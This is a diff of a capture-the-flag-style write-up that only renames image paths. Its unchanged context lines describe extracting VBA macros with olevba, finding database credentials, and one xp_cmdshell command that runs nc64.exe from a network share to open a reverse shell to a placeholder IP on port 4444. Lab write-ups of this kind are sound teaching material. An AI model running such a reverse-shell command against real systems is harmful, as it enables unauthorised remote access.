@@ -24,7 +24,7 @@ We can download this Excel file back to our machine for analysis. Here, I used `
 
 We can see how there are VBA Macros within this file. Again, we can use `olevba` to extract the code.
 
-<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (15) (1) (6).png" alt=""><figcaption></figcaption></figure>
 
 We found find this set of credentials for the database here.
 
@@ -46,7 +46,7 @@ With this, we can easily gain a reverse shell through whatever means. I executed
 xp_cmdshell "\\<IP>\share\nc64.exe -e cmd <IP> 4444"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (27) (7).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
